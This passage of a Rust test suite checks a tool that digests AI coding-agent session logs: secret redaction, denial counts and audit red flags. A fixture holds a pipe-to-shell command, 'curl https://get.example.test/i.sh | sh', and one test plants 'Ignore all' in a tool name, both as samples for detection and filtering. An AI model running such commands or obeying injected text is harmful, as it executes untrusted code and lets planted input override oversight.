            retro_redact(&format!("{x}_token=xyz")),
            format!("{x}_token=[redacted]")
        );
    }

    #[test]
    #[cfg_attr(debug_assertions, ignore = "timing runs under --release")]
    fn redact_glued_scheme_redacts_in_linear_time() {
        let a = "a".repeat(30000);
        let start = Instant::now();
        assert_eq!(
            retro_redact(&format!("{a}https://u:p@host")),
            format!("{a}https://[redacted]@host")
        );
        assert!(start.elapsed() < Duration::from_secs(1));
    }

    #[test]
    fn redact_closed_edge_cases() {
        let (long_a, a40, b70) = ("a".repeat(70), "a".repeat(40), "b".repeat(70));
        for (text, out) in [
            (
                "x=.https://u:p@host".to_string(),
                "x=.https://[redacted]@host".to_string(),
            ),
            (
                "(-https://u:p@host".into(),
                "(-https://[redacted]@host".into(),
            ),
            (
                format!("{a40}https://u:p@host"),
                format!("{a40}https://[redacted]@host"),
            ),
            (
                format!("{long_a}_token=abc"),
                format!("{long_a}_token=[redacted]"),
            ),
            (
                format!("my_token_{b70}=abc"),
                format!("my_token_{b70}=[redacted]"),
            ),
            (
                format!("--{long_a}-token abc"),
                format!("--{long_a}-token [redacted]"),
            ),
            ("max_tokens: 4096".into(), "max_tokens: 4096".into()),
            (
                "{\"max_tokens\": 4096}".into(),
                "{\"max_tokens\": 4096}".into(),
            ),
            ("--max-tokens 4096".into(), "--max-tokens 4096".into()),
            ("MAX_TOKENS=abc".into(), "MAX_TOKENS=[redacted]".into()),
            ("api_token=4096".into(), "api_token=[redacted]".into()),
            ("TokenSecret=123456".into(), "TokenSecret=[redacted]".into()),
            ("tokensecret: 42".into(), "tokensecret: [redacted]".into()),
            (
                "secretokens=1234567".into(),
                "secretokens=[redacted]".into(),
            ),
            (
                "git clone https://u:p@ss@host/r".into(),
                "git clone https://[redacted]@host/r".into(),
            ),
            (
                "https://u:p@host/a@b".into(),
                "https://[redacted]@host/a@b".into(),
            ),
        ] {
            assert_eq!(retro_redact(&text), out, "{}", cut(&text, 20));
        }
    }

    /// Every pattern this file declares, by name.
    fn retro_patterns() -> Vec<(&'static str, &'static Pattern)> {
        vec![
            ("RETRO_JOB", &RETRO_JOB),
            ("RETRO_PATH", &RETRO_PATH),
            ("RETRO_ASSIGN", &RETRO_ASSIGN),
            ("RETRO_HEADERS", &RETRO_HEADERS),
            ("RETRO_URL_CREDS", &RETRO_URL_CREDS),
            ("RETRO_BEARER", &RETRO_BEARER),
            ("RETRO_USER_PASS", &RETRO_USER_PASS),
            ("RETRO_MYSQL", &RETRO_MYSQL),
            ("RETRO_MYSQL_PASS", &RETRO_MYSQL_PASS),
            ("RETRO_SSHPASS", &RETRO_SSHPASS),
            ("RETRO_SSHPASS_PASS", &RETRO_SSHPASS_PASS),
            ("RETRO_REDIS", &RETRO_REDIS),
            ("RETRO_REDIS_PASS", &RETRO_REDIS_PASS),
            ("RETRO_DOCKER_LOGIN", &RETRO_DOCKER_LOGIN),
            ("RETRO_OPENSSL", &RETRO_OPENSSL),
            ("RETRO_OPENSSL_PASS", &RETRO_OPENSSL_PASS),
            ("RETRO_OPENSSL_K", &RETRO_OPENSSL_K),
            ("RETRO_OPENSSL_BARE", &RETRO_OPENSSL_BARE),
            ("RETRO_COMMAND_SPLIT", &RETRO_COMMAND_SPLIT),
            ("RETRO_PASSWORD_STDIN", &RETRO_PASSWORD_STDIN),
            ("RETRO_ECHO_PASS", &RETRO_ECHO_PASS),
            ("RETRO_SECRET_WORD", &RETRO_SECRET_WORD),
            ("RETRO_COUNT", &RETRO_COUNT),
            ("RETRO_KEYVALUE", &RETRO_KEYVALUE),
            ("RETRO_FLAG", &RETRO_FLAG),
            ("RETRO_LONG_KEYVALUE", &RETRO_LONG_KEYVALUE),
            ("RETRO_LONG_FLAG", &RETRO_LONG_FLAG),
            ("RETRO_HOME", &RETRO_HOME),
            ("RETRO_SESSION_REF", &RETRO_SESSION_REF),
            ("RETRO_SESSION", &RETRO_SESSION),
            ("RETRO_FLAG_NAME", &RETRO_FLAG_NAME),
            ("RETRO_POLLS[0]", &RETRO_POLLS[0].1),
            ("RETRO_POLLS[1]", &RETRO_POLLS[1].1),
            ("RETRO_POLLS[2]", &RETRO_POLLS[2].1),
            ("HOST_NAME", &HOST_NAME),
            ("RUN_TAG", &RUN_TAG),
            ("SIGNATURE", &SIGNATURE),
            ("DISPUTE_ROW", &DISPUTE_ROW),
            ("REPEATED_SIGNATURE", &REPEATED_SIGNATURE),
            ("DIGITS", &DIGITS),
            ("ROUND_DIR", &ROUND_DIR),
        ]
    }

    #[test]
    #[cfg_attr(debug_assertions, ignore = "timing runs under --release")]
    fn redact_every_retro_pattern_runs_in_linear_time() {
        let a70 = "a".repeat(70) + " ";
        let a40 = "a".repeat(40) + "://";
        let a40u = "a".repeat(40) + "://u:p@";
        let a40s = "a".repeat(40) + "://u:p@ss@";
        let mut units: Vec<&str> = "aZ09-.+_:/".split("").filter(|s| !s.is_empty()).collect();
        units.extend([
            " ",
            "\t",
            "a.",
            "a-",
            "a+",
            "a1",
            "--a",
            "token",
            "password",
            "bearer ",
            "-u ",
            "://",
            "a=",
            "--a ",
            "_token=",
            "tokens",
            &a70,
            &a40,
            &a40u,
            "@",
            "://u:p@ss@",
            &a40s,
            "mysql ",
            "sshpass ",
            "mysql -p\"",
            "mysql -p'",
            " -p",
            "sshpass -p \"",
            "Authorization:\\ ",
            "redis-cli ",
            "redis-cli -a ",
            "docker login ",
            "openssl ",
            " -passin pass:",
            "SSHPASS=",
            "Authorization:\\$",
            "\\$",
            "openssl -k ",
            " -k ",
            " -passin ",
            "echo ",
            "echo a | ",
            "echo \"",
            "| docker login --password-stdin ",
            "docker login echo a | ",
        ]);
        for unit in units {
            let text: String = unit.repeat(30000).chars().take(30000).collect();
            for (name, p) in retro_patterns() {
                let start = Instant::now();
                p.replace_all(&text, |_| String::new());
                assert!(
                    start.elapsed() < Duration::from_secs(1),
                    "{name} on {unit:?}"
                );
            }
            let start = Instant::now();
            retro_redact(&text);
            assert!(
                start.elapsed() < Duration::from_secs(1),
                "redact on {unit:?}"
            );
        }
    }

    #[test]
    #[cfg_attr(debug_assertions, ignore = "timing runs under --release")]
    fn retro_patterns_adversarial_inputs() {
        let inputs = [
            "a".repeat(16384),
            "a.".repeat(8192),
            " ".repeat(16384),
            "ignore ".repeat(2340),
            ":/".repeat(8192),
            "<".repeat(16384),
        ];
        for (name, p) in retro_patterns() {
            for text in &inputs {
                let best = (0..3)
                    .map(|_| {
                        let start = Instant::now();
                        p.search(text);
                        start.elapsed()
                    })
                    .min()
                    .unwrap();
                assert!(
                    best < Duration::from_millis(50),
                    "{name} on {:?}",
                    &text[..8]
                );
            }
        }
    }

    #[test]
    fn redact_project_folds_home() {
        let rows = digest_of(&projects("fold"), 1.0);
        assert_eq!(
            rows[0]["project"],
            "~--paseo-worktrees-ab12-factory-1017-add-x"
        );
        assert_eq!(project_slug("-Users-x-dev", "/nonexistent"), "~-dev");
        assert_eq!(project_slug("C--Users-x-dev", "/nonexistent"), "~-dev");
        assert_eq!(project_slug("-srv-home-x", "/nonexistent"), "-srv-home-x");
    }

    #[test]
    fn redact_project_folds_a_hyphenated_home() {
        for (home, slug, folded) in [
            ("/Users/john.doe", "-Users-john-doe-dev", "~-dev"),
            ("/home/john-doe", "-home-john-doe", "~"),
            ("C:\\Users\\john.doe", "C--Users-john-doe-dev", "~-dev"),
        ] {
            assert_eq!(project_slug(slug, home), folded, "{home}");
        }
        assert_eq!(
            project_slug("-Users-john-doer-dev", "/Users/john.doe"),
            "~-doer-dev"
        );
    }

    #[test]
    fn redact_every_string_and_key_clipped() {
        let projects = projects("clip");
        let tool = "T".repeat(300);
        session(
            &projects,
            &format!("-home-u-{}", "p".repeat(200)),
            "s2",
            &[
                assistant("a1", &[(&tool, json!({}))]),
                result("a1", &"x ".repeat(300), true, 0),
            ],
        );
        let rows = digest_of(&projects, 1.0);
        let s2 = rows.iter().find(|r| r["session"] == "s2").unwrap();
        assert_eq!(s2["tools"], json!({"T".repeat(160): 1}));
        assert!(all_clipped(&rows));
        assert_eq!(
            clip(json!({"k".repeat(200): ["v".repeat(200), {"n": 1}]})),
            json!({"k".repeat(160): ["v".repeat(160), {"n": 1}]})
        );
    }

    #[cfg(unix)]
    #[test]
    fn digest_vanished_files_skipped() {
        let projects = projects("vanished");
        let sub = projects.join(SLUG).join("s1/subagents/agent-b1.jsonl");
        fs::remove_file(&sub).unwrap();
        fs::create_dir(&sub).unwrap();
        std::os::unix::fs::symlink(
            projects.join("gone.jsonl"),
            projects.join(SLUG).join("s2.jsonl"),
        )
        .unwrap();
        fs::create_dir(projects.join(SLUG).join("s3.jsonl")).unwrap();
        let rows = digest_of(&projects, 1.0);
        let sessions: Vec<&Value> = rows.iter().map(|r| &r["session"]).collect();
        assert_eq!(sessions, [&json!("s1")]);
        assert_eq!(rows[0]["subagents"], json!({"count": 0, "by_type": {}}));
    }

    #[test]
    fn digest_usage_dedupes_by_message_id() {
        let row = &digest_of(&projects("dedupe"), 1.0)[0];
        assert_eq!(row["turns"], 2);
        assert_eq!(
            row["tokens"],
            json!({"cache_read": 170000, "cache_write": 0, "uncached_input": 3000, "output": 600})
        );
    }

    #[test]
    fn digest_subagent_errors_by_type() {
        let projects = projects("subagent");
        let row = &digest_of(&projects, 1.0)[0];
        let builder = &row["subagents"]["by_type"]["factory-builder"];
        assert_eq!(row["subagents"]["count"], 1);
        assert_eq!(
            (&builder["count"], &builder["turns"], &builder["errors"]),
            (&json!(1), &json!(1), &json!(1))
        );
        assert_eq!(builder["tokens"]["cache_write"], 19000);
        assert_eq!(builder["first_turns"], json!([19100]));
        assert_eq!(row["errors"]["count"], 0);
        fs::remove_file(projects.join(SLUG).join("s1/subagents/agent-b1.meta.json")).unwrap();
        assert_eq!(
            digest_of(&projects, 1.0)[0]["subagents"]["by_type"]["unknown"]["errors"],
            1
        );
    }

    #[test]
    fn digest_list_form_human_messages() {
        let projects = projects("human");
        let scan = scan_of(
            &projects,
            &[
                json!({"type": "user", "message": {"content": [{"type": "text", "text": "ship it"}]}}),
                json!({"type": "user", "message": {"content": "plain words"}}),
                json!({"type": "user", "message": {"content": [{"type": "text", "text": "[Request interrupted by user]"}]}}),
                json!({"type": "user", "message": {"content": "<command-name>/clear</command-name>"}}),
                json!({"type": "user", "isMeta": true, "message": {"content": "meta"}}),
                json!({"type": "user", "message": {"content": [{"type": "text", "text": ""}]}}),
                assistant("a1", &[bash("ls")]),
                result("a1", "fine", false, 0),
            ],
        );
        assert_eq!(
            (&scan["human_msgs"], &scan["interrupts"]),
            (&json!(3), &json!(1))
        );
        assert_eq!(digest_of(&projects, 1.0)[0]["human_msgs"], 1);
    }

    #[test]
    fn digest_denials_and_blocked_sleep() {
        let mut entries = Vec::new();
        for (n, text) in [
            "Permission to use Bash has been denied by the Claude Code auto mode classifier.",
            "The user doesn't want to proceed with this tool use.",
            "Blocked: sleep 30 is not allowed",
            "Exit code 1 Permission denied",
        ]
        .iter()
        .enumerate()
        {
            entries.push(assistant(&format!("a{n}"), &[bash("ls")]));
            entries.push(result(&format!("a{n}"), text, true, 0));
        }
        entries.push(assistant("z", &[bash("ls")]));
        entries.push(result("z", "ok", false, 0));
        let scan = scan_of(&projects("denials"), &entries);
        assert_eq!(
            (&scan["denials"]["count"], &scan["denials"]["blocked_sleep"]),
            (&json!(2), &json!(1))
        );
        assert_eq!(scan["errors"]["count"], 1);
        let patterns: Vec<&String> = scan["errors"]["patterns"]
            .as_object()
            .unwrap()
            .keys()
            .collect();
        assert_eq!(patterns, ["Exit code N Permission denied"]);
    }

    #[test]
    fn digest_final_self_termination_is_benign() {
        let projects = projects("benign");
        let archive = bash("python3 factory.py archive-workspace factory/1017-add-x");
        let paseo = ("mcp__paseo__archive_workspace", json!({"id": "w1"}));
        let counts = |s: &Value| (s["errors"]["count"].clone(), s["errors"]["benign"].clone());
        let last = scan_of(
            &projects,
            &[
                assistant("a1", &[archive.clone()]),
                result("a1", "Exit code 137", true, 0),
            ],
        );
        assert_eq!(counts(&last), (json!(0), json!(1)));
        let closed = scan_of(
            &projects,
            &[
                assistant("a1", &[paseo]),
                result("a1", "MCP error: Connection closed", true, 0),
            ],
        );
        assert_eq!(counts(&closed), (json!(0), json!(1)));
        let middle = scan_of(
            &projects,
            &[
                assistant("a1", &[archive]),
                result("a1", "Exit code 137", true, 0),
                assistant("a2", &[bash("ls")]),
                result("a2", "ok", false, 0),
            ],
        );
        assert_eq!(counts(&middle), (json!(1), json!(0)));
        fs::remove_file(projects.join("-home-u-scratch/s2.jsonl")).unwrap();
        assert_eq!(counts(&digest_of(&projects, 1.0)[0]), (json!(0), json!(1)));
    }

    #[test]
    fn digest_repeated_cmds_strip_assignments() {
        let cmds = [
            "FOO=1 git status",
            "git status",
            "A='x y' B=2 git status",
            "git log",
        ];
        let entries: Vec<Value> = cmds
            .iter()
            .enumerate()
            .map(|(n, c)| assistant(&format!("a{n}"), &[bash(c)]))
            .collect();
        let scan = scan_of(&projects("repeated"), &entries);
        assert_eq!(scan["repeated_cmds"], json!({"git status": 3}));
        assert_eq!(command_key("FOO=1 git status"), command_key("git status"));
    }

    #[test]
    fn digest_context_and_markers() {
        let projects = projects("context");
        let row = &digest_of(&projects, 1.0)[0];
        assert_eq!(
            row["context"],
            json!({"first_turn": 82000, "mean_per_turn": 86500})
        );
        assert_eq!(row["agent_prompts"], json!({"count": 1, "chars": 40}));
        let kinds: Vec<&String> = row["first_turn_attachments"]
            .as_object()
            .unwrap()
            .keys()
            .collect();
        assert_eq!(kinds, ["skill_listing"]);
        assert!(
            row["first_turn_attachments"]["skill_listing"]
                .as_i64()
                .unwrap()
                > 100
        );
        assert!(row["review_round_max"].is_null());
        let scan = scan_of(
            &projects,
            &[
                json!({"type": "attachment", "attachment": {"type": "skill_listing", "content": "x"}}),
                assistant(
                    "a1",
                    &[
                        bash("until [ -f /tmp/done ]; do sleep 5; done"),
                        ("Read", json!({"file_path": "/tmp/tasks/b7-x.output"})),
                        bash("stat -c %Y round-2/review.md"),
                        ("Read", json!({"file_path": "jobs/round-3/review.md"})),
                    ],
                ),
                json!({"type": "attachment", "attachment": {"type": "late", "content": "y"}}),
                result(
                    "a1",
                    "zsh: command not found: foo\nNode.js v24.0.0",
                    true,
                    0,
                ),
                result("a1", "zsh: no matches found: *.png", true, 1),
            ],
        );
        assert_eq!(
            scan["polls"],
            json!({"until_file": 1, "task_output": 1, "quiet_window": 1})
        );
        assert_eq!(scan["review_round_max"], 3);
        let kinds: Vec<&String> = scan["first_turn_attachments"]
            .as_object()
            .unwrap()
            .keys()
            .collect();
        assert_eq!(kinds, ["skill_listing"]);
        assert_eq!(
            scan["env_noise"],
            json!({"winsize_crash": 0, "command_not_found": 1, "zsh_no_matches": 1, "node_crash": 1})
        );
        fs::write(
            projects.join(SLUG).join("s1/subagents/agent-b2.jsonl"),
            dumps(
                &result("x", "undefined method `winsize' for nil", true, 0),
                DEFAULT,
            ) + "\n",
        )
        .unwrap();
        assert_eq!(
            digest_of(&projects, 1.0)[0]["env_noise"]["winsize_crash"],
            1
        );
    }

    #[test]
    fn digest_error_patterns_normalized() {
        let mut entries = Vec::new();
        for n in 0..20 {
            let text = format!("cat: /tmp/run{n}/x.txt: No such file or directory (exit {n})");
            entries.push(assistant(&format!("a{n}"), &[bash("cat")]));
            entries.push(result(&format!("a{n}"), &text, true, 0));
            entries.push(assistant(&format!("b{n}"), &[bash("cat")]));
            entries.push(result(
                &format!("b{n}"),
                &format!("error kind {}", (b'a' + n as u8) as char),
                true,
                0,
            ));
        }
        let scan = scan_of(&projects("patterns"), &entries);
        assert_eq!(scan["errors"]["count"], 40);
        assert_eq!(
            scan["errors"]["patterns"]["cat: <path>: No such file or directory (exit N)"],
            20
        );
        assert_eq!(scan["errors"]["patterns"].as_object().unwrap().len(), 21);
    }

    #[test]
    fn digest_excerpts_redacted_and_clipped() {
        let projects = projects("excerpts");
        let github = format!("ghp_{}", "A".repeat(36));
        let key = format!("sk-{}", "b".repeat(30));
        let texts = [
            format!("push failed with {github} {}", "y ".repeat(200)),
            format!("curl -H password={key}x"),
            "api_key: hunter-value".to_string(),
        ];
        let mut entries = Vec::new();
        for (n, text) in texts.iter().enumerate() {
            entries.push(assistant(&format!("a{n}"), &[bash(text)]));
            entries.push(result(&format!("a{n}"), text, true, 0));
        }
        entries.push(assistant("d", &[bash("ls")]));
        entries.push(result(
            "d",
            &format!("Permission to use Bash with {github}"),
            true,
            0,
        ));
        session(&projects, SLUG, "s3", &entries);
        let rows = digest_of(&projects, 1.0);
        let out = dumps(&json!(rows), DEFAULT);
        for secret in [github.as_str(), key.as_str(), "hunter"] {
            assert!(!out.contains(secret), "{secret}");
        }
        assert!(out.contains("[redacted]"));
        assert!(all_clipped(&rows));
        assert_eq!(pattern(&"z".repeat(400)).chars().count(), 160);
    }

    #[test]
    fn digest_lone_surrogate_escape_keeps_the_line() {
        let path = projects("surrogate").join("lone.jsonl");
        fs::write(
            &path,
            concat!(
                r#"{"type": "assistant", "timestamp": "2026-11-10T10:00:00Z", "message": {"id": "m1", "usage": {"input_tokens": 1}}}"#,
                "\n",
                r#"{"type": "assistant", "timestamp": "2026-11-10T10:05:00Z", "message": {"id": "m2", "usage": {"input_tokens": 1}, "content": "bad \ud83d end"}}"#,
                "\n"
            ),
        )
        .unwrap();
        let scan = scan(&path, true).unwrap();
        assert_eq!(scan["turns"], 2);
        assert_eq!(scan["end"], "2026-11-10T10:05:00Z");
        assert_eq!(
            loads_lenient(r#"["a \ud83d b", "\ude00", "\\ud83d", "😀"]"#).unwrap(),
            json!(["a \u{fffd} b", "\u{fffd}", "\\ud83d", "\u{1F600}"])
        );
        assert!(loads_lenient("not json").is_err());
    }

    #[test]
    fn digest_needs_a_home_directory() {
        let e = home_text(None).unwrap_err();
        assert_eq!(e.code, 1);
        assert_eq!(
            home_text(Some(PathBuf::from("/home/u"))).unwrap(),
            "/home/u"
        );
    }

    #[test]
    fn digest_window_job_and_host() {
        let projects = projects("window");
        let old = session(
            &projects,
            "-home-u-scratch",
            "old",
            &[json!({"type": "user", "message": {"content": "old"}})],
        );
        File::options()
            .write(true)
            .open(&old)
            .unwrap()
            .set_modified(SystemTime::now() - Duration::from_secs(3 * 86400))
            .unwrap();
        session(
            &projects,
            "-home-u-scratch",
            "s2",
            &[
                json!({"type": "user", "message": {"content": "hi"}, "timestamp": "2026-11-10T08:00:00Z"}),
            ],
        );
        session(
            &projects,
            "-home-u-scratch",
            "empty",
            &[json!({"type": "summary", "timestamp": null})],
        );
        let rows = digest_of(&projects, 1.0);
        let got: Vec<(&Value, &Value, &Value)> = rows
            .iter()
            .map(|r| (&r["session"], &r["job"], &r["host"]))
            .collect();
        assert_eq!(
            got,
            [
                (&json!("s2"), &json!("ad-hoc"), &json!("host-x")),
                (&json!("s1"), &json!("1017"), &json!("host-x"))
            ]
        );
        let mut five: Vec<String> = digest_of(&projects, 5.0)
            .iter()
            .map(|r| r["session"].as_str().unwrap().to_string())
            .collect();
        five.sort();
        assert_eq!(five, ["old", "s1", "s2"]);
        let home = projects.parent().unwrap();
        fs::write(home.join("config.md"), "---\ndevice: example-host\n---\n").unwrap();
        assert_eq!(host(home).unwrap(), "example-host");
        fs::remove_file(home.join("config.md")).unwrap();
        assert_eq!(host(home).unwrap(), hostname());
    }

    const TODAY: &str = "2026-11-12";
    const RUN: &str = "20261112T090000Z-a1b2c3";
    const S1: &str = "3ae1fc86-0000-4000-8000-000000000001";
    const S2: &str = "3ae1fc86-0000-4000-8000-000000000002";
    const S3: &str = "3ae1fc86-0000-4000-8000-000000000003";

    type Reply = (u16, String, Vec<(String, String)>);

    /// A Get that answers each path from routes, and 404 elsewhere.
    fn serve(routes: &HashMap<String, Reply>) -> impl FnMut(&str, &[u16]) -> Res<Response> + '_ {
        move |path, ok| {
            let (status, body, headers) =
                routes
                    .get(path)
                    .cloned()
                    .unwrap_or((404, String::new(), Vec::new()));
            if !ok.contains(&status) {
                return Err(fail(format!("GET {path} returned {status}: "), 5));
            }
            Ok(Response {
                status,
                headers,
                body: body.into_bytes(),
            })
        }
    }

    fn reply(body: Value) -> Reply {
        let text = match body {
            Value::String(s) => s,
            other => dumps(&other, DEFAULT),
        };
        (200, text, Vec::new())
    }

    fn digest_row(host: &str, session: &str, job: &str, over: Value) -> Value {
        let mut row = json!({"host": host, "project": "~-dev-factory", "session": session, "job": job,
            "start": "2026-11-10T09:00:00Z", "end": "2026-11-10T10:00:00Z", "turns": 4, "human_msgs": 1,
            "interrupts": 0, "models": ["claude-opus-5-5"], "tools": {"Bash": 3},
            "tokens": {"cache_read": 100, "cache_write": 10, "uncached_input": 5, "output": 1},
            "context": {"first_turn": 1000, "mean_per_turn": 2000},
            "first_turn_attachments": {"skill_listing": 300}, "agent_prompts": {"count": 1, "chars": 50},
            "review_round_max": 1, "polls": {"sleep": 1}, "env_noise": {"winsize_crash": 2},
            "errors": {"count": 2, "benign": 0, "patterns": {"winsize crash": 2}},
            "denials": {"count": 1, "blocked_sleep": 1, "patterns": {"denied rm": 1}},
            "repeated_cmds": {"ls <path>": 3},
            "subagents": {"count": 1, "by_type": {"factory-builder": {
                "count": 1, "turns": 7, "tokens": {"cache_read": 40, "cache_write": 0, "uncached_input": 2, "output": 3},
                "errors": 1, "denials": 0, "models": ["claude-opus-5-5"], "first_turns": [500]}}}});
        for (k, v) in over.as_object().unwrap() {
            row[k] = v.clone();
        }
        row
    }

    fn lines(rows: &[Value]) -> String {
        rows.iter().map(|r| dumps(r, DEFAULT) + "\n").collect()
    }

    fn day(back: i64) -> String {
        shift_date(TODAY, -back)
    }

    /// Routes for every date in the window; pushed holds (days back, [(host, digest text)]).
    fn window(days: i64, pushed: &[(i64, Vec<(&str, String)>)]) -> HashMap<String, Reply> {
        let mut routes: HashMap<String, Reply> = [
            (
                "/projects.json",
                reply(json!([{"slug": "factory"}, {"slug": "sample-tools"}])),
            ),
            (
                "/api/audit-flags",
                reply(json!({"schema": "factory.audit-flags/1", "rows": []})),
            ),
            ("/api/board", reply(board(json!([])))),
            (
                "/api/pipeline/projects/factory",
                (
                    200,
                    dumps(
                        &json!({"schema": 1, "stage_notes": {"spec": "Keep it short."}}),
                        DEFAULT,
                    ),
                    vec![("X-Pipeline-Version".into(), "7".into())],
                ),
            ),
            (
                "/api/pipeline/effective/factory",
                reply(json!({"pickup": {"enabled": true, "hosts": ["host-a", "host-c"]}})),
            ),
            (
                "/api/project-history/factory/project.md",
                reply(json!([{"version": 3, "saved_at": "2026-11-12T08:00:00Z"}])),
            ),
            (
                "/api/project-history/factory/notes.md",
                reply(json!([{"version": 4, "saved_at": "2026-11-12T08:00:00Z"}])),
            ),
            (
                "/api/project-history/factory/decisions.md",
                reply(json!([])),
            ),
            (
                "/api/project-history/factory/runbook.md",
                reply(json!([{"version": 1, "saved_at": "2026-11-12T08:00:00Z"}])),
            ),
            (
                "/api/projects/factory.md",
                reply(json!(
                    "---\nrepo: example/factory\nbase: main\ntitle: Factory\n---\n"
                )),
            ),
            (
                "/api/project-documents/factory/notes.md",
                reply(json!("- Run pnpm test.\n")),
            ),
            (
                "/api/project-documents/factory/decisions.md",
                reply(json!("# Decisions\n")),
            ),
            (
                "/api/project-documents/factory/runbook.md",
                reply(json!("# Runbook\n")),
            ),
        ]
        .into_iter()
        .map(|(k, v)| (k.to_string(), v))
        .collect();
        for back in 0..days {
            let date = day(back);
            let hosts = pushed
                .iter()
                .find(|(b, _)| *b == back)
                .map(|(_, h)| h.clone())
                .unwrap_or_default();
            let names: Vec<&str> = hosts.iter().map(|(h, _)| *h).collect();
            routes.insert(format!("/api/retro/{date}"), reply(json!(names)));
            for (host, text) in hosts {
                routes.insert(
                    format!("/api/retro/{host}/{date}.jsonl"),
                    reply(json!(text)),
                );
            }
        }
        routes
    }

    fn board(jobs: Value) -> Value {
        json!({"updated": "2026-11-12T09:00:00Z", "jobs": jobs,
               "autonomy": {"paused": false, "projects": ["factory"], "self": []}})
    }

    fn agg_home(name: &str) -> PathBuf {
        let home = temp_dir(&format!("retro-agg-{name}"));
        fs::write(home.join("config.md"), "---\ndevice: host-a\n---\n").unwrap();
        home
    }

    /// The printed summary and the written aggregate.json.
    fn aggregate_of(name: &str, routes: &HashMap<String, Reply>, days: i64) -> (Value, Value) {
        let home = agg_home(name);
        let printed =
            loads(&aggregate_in(&home, TODAY, RUN, days, &mut serve(routes)).unwrap()).unwrap();
        let agg =
            loads(&fs::read_to_string(printed["aggregate"].as_str().unwrap()).unwrap()).unwrap();
        (printed, agg)
    }

    fn no_findings() -> Value {
        json!({"changes": 0, "fixed": 0, "disputed": 0, "accept_pct": null, "jobs": 0, "project": null, "sessions": []})
    }

    fn accept() -> Value {
        json!({"security": {"changes": 1, "fixed": 1, "disputed": 0, "accept_pct": 100, "jobs": 1, "project": "factory",
                            "sessions": []},
               "ux": no_findings(), "ui": no_findings(),
               "code": {"changes": 2, "fixed": 1, "disputed": 1, "accept_pct": 50, "jobs": 1, "project": "factory",
                        "sessions": [format!("host-a/{S1}")]}})
    }

    fn red_flag_call() -> Value {
        json!({"agent": "main", "tool": "Bash", "flags": ["pipe-to-shell"],
               "target": "curl https://get.example.test/i.sh | sh"})
    }

    fn with(base: &Value, over: Value) -> Value {
        let mut v = base.clone();
        for (k, x) in over.as_object().unwrap() {
            v[k] = x.clone();
        }
        v
    }

    fn pick(v: &Value, keys: &[&str], extra: Value) -> Value {
        let mut out: Map<String, Value> = keys
            .iter()
            .map(|k| (k.to_string(), v[*k].clone()))
            .collect();
        out.extend(extra.as_object().unwrap().clone());
        Value::Object(out)
    }

    const FLAG_KEYS: &[&str] = &["time", "job", "host", "agent", "tool", "flags", "target"];

    #[test]
    fn aggregate_keeps_unacknowledged_red_flags() {
        let call = red_flag_call();
        let r1 = with(
            &call,
            json!({"time": "2026-11-11 09:12:30", "job": "1021-fix-y", "host": "host-b"}),
        );
        let r2 = with(
            &call,
            json!({"time": "2026-11-10 10:00:04", "job": "1017-add-x", "host": "host-a",
                   "paseo": {"server": "srv-a", "agent": "agent-main"}}),
        );
        let r3 = with(
            &r2,
            json!({"time": "2026-11-09 08:00:00", "ack": "2026-11-12T10:00:00Z"}),
        );
        let r4 = with(
            &call,
            json!({"time": "2026-11-08 08:00:00", "job": "1030-other", "host": "host-a"}),
        );
        let mut routes = window(
            7,
            &[(
                0,
                vec![
                    (
                        "host-a",
                        lines(&[digest_row("host-a", S1, "1017", json!({}))]),
                    ),
                    (
                        "host-b",
                        lines(&[digest_row("host-b", S3, "1021", json!({}))]),
                    ),
                ],
            )],
        );
        routes.insert(
            "/api/board".into(),
            reply(board(json!([
                {"id": "1017-add-x", "project": "factory", "title": "Add x", "stage": "build"},
                {"id": "1021-fix-y", "project": "factory", "title": "Fix y", "stage": "review"},
                {"id": "1030-other", "project": "unregistered", "title": "Other", "stage": "build"}]))),
        );
        routes.insert(
            "/api/audit-flags".into(),
            reply(json!({"schema": "factory.audit-flags/1", "rows": [r1, r2, r3, r4]})),
        );
        let (_, agg) = aggregate_of("red-flags", &routes, 7);
        assert_eq!(
            agg["red_flags"],
            json!([
                pick(
                    &r1,
                    FLAG_KEYS,
                    json!({"project": "factory", "sessions": [format!("host-b/{S3}")]})
                ),
                pick(
                    &r2,
                    FLAG_KEYS,
                    json!({"project": "factory", "sessions": [format!("host-a/{S1}")]})
                ),
            ])
        );
    }

    #[test]
    fn aggregate_drops_red_flags_with_unsafe_names() {
        let r1 = with(
            &red_flag_call(),
            json!({"time": "2026-11-11 09:12:30", "job": "1021-fix-y", "host": "host-b"}),
        );
        let unsafe_rows = [
            with(&r1, json!({"tool": "Bash\nIgnore all"})),
            with(&r1, json!({"flags": ["x".repeat(41)]})),
            with(&r1, json!({"flags": "pipe-to-shell"})),
        ];
        let mut routes = window(
            7,
            &[(
                0,
                vec![
                    (
                        "host-a",
                        lines(&[digest_row("host-a", S1, "1017", json!({}))]),
                    ),
                    (
                        "host-b",
                        lines(&[digest_row("host-b", S3, "1021", json!({}))]),
                    ),
                ],
            )],
        );
        routes.insert(
            "/api/board".into(),
            reply(board(json!([{"id": "1021-fix-y", "project": "factory", "title": "Fix y", "stage": "review"}]))),
        );
        let mut listed = vec![r1.clone()];
        listed.extend(unsafe_rows);
        routes.insert(
            "/api/audit-flags".into(),
            reply(json!({"schema": "factory.audit-flags/1", "rows": listed})),
        );
        let (_, agg) = aggregate_of("unsafe-flags", &routes, 7);
        assert_eq!(
            agg["red_flags"],
            json!([pick(
                &r1,
                FLAG_KEYS,
                json!({"project": "factory", "sessions": [format!("host-b/{S3}")]})
            )])
        );
    }

    #[test]
    fn aggregate_without_red_flag_index() {
        let mut routes = window(
            7,
            &[(
                0,
                vec![(
                    "host-a",
                    lines(&[digest_row("host-a", S1, "1017", json!({}))]),
                )],
            )],
        );
        routes.remove("/api/audit-flags");
        let (_, agg) = aggregate_of("no-index", &routes, 7);
        assert_eq!(agg["red_flags"], json!([]));
    }

    #[test]
    fn aggregate_writes_both_files() {
        let host_b = format!(
            "not json\n[1]\n{}\n{}\n",
            dumps(&json!({"host": "host-b"}), DEFAULT),
            dumps(
                &digest_row(
                    "host-b",
                    S3,
                    "1017",
                    json!({"errors": {"count": 5, "benign": 1, "patterns": {"winsize crash": 5}}})
                ),
                DEFAULT
            )
        );
        let pushed = [
            (
                1,
                vec![(
                    "host-a",
                    lines(&[
                        digest_row("host-a", S1, "1017", json!({})),
                        digest_row("host-a", S2, "ad-hoc", json!({"review_round_max": null})),
                    ]),
                )],
            ),
            (0, vec![("host-b", host_b)]),
        ];
        let home = agg_home("both");
        let summary = aggregate_in(&home, TODAY, RUN, 7, &mut serve(&window(7, &pushed))).unwrap();
